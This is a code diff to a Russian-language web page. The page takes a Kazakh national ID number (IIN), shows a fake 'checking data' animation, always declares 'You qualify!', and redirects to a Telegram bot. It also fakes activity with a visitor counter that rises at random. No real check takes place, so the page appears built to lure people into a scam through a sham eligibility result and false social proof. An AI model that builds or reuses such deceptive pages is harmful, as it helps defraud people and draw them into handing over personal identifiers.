@@ -158,21 +158,48 @@
   </footer>
 
   <!-- Скрипты -->
-  <script>
-    function startCheck() {
-      const iin = document.getElementById('iinInput').value.trim();
-      if (iin.length < 7) {
-        alert('Пожалуйста, введите корректный ИИН.');
-        return;
-      }
-      window.location.href = "https://t.me/your_bot";
+  <!-- ВСТАВЬ В КОНЕЦ ПЕРЕД </body> -->
+<script>
+  function startCheck() {
+    const iin = document.getElementById('iinInput').value.trim();
+    if (iin.length < 7) {
+      alert('Пожалуйста, введите корректный ИИН.');
+      return;
     }
 
-    let counter = document.getElementById('counter');
-    setInterval(() => {
-      counter.innerText = parseInt(counter.innerText) + Math.floor(Math.random() * 3);
-    }, 5000);
-  </script>
+    const loader = document.createElement('div');
+    loader.className = "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50";
+    loader.innerHTML = `
+      <div class="bg-white p-6 rounded-xl shadow-xl text-center space-y-4 animate-fade-in w-72">
+        <div class="text-lg font-semibold text-primary">Проверка данных...</div>
+        <div class="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
+          <div class="h-full bg-accent animate-pulse" style="width: 100%;"></div>
+        </div>
+        <div class="text-sm text-gray-500">Пожалуйста, подождите</div>
+      </div>
+    `;
+    document.body.appendChild(loader);
+
+    setTimeout(() => {
+      loader.innerHTML = `
+        <div class="bg-white p-6 rounded-xl shadow-xl text-center space-y-4 animate-fade-in w-72">
+          <div class="text-lg font-semibold text-green-600">✅ Вы подходите!</div>
+          <div class="text-sm text-gray-600">Происходит перенаправление...</div>
+        </div>
+      `;
+    }, 2500);
+
+    setTimeout(() => {
+      window.location.href = "https://t.me/your_bot";
+    }, 4500);
+  }
+
+  let counter = document.getElementById('counter');
+  setInterval(() => {
+    counter.innerText = parseInt(counter.innerText) + Math.floor(Math.random() * 3);
+  }, 5000);
+</script>
+
 
 </body>
 </html>
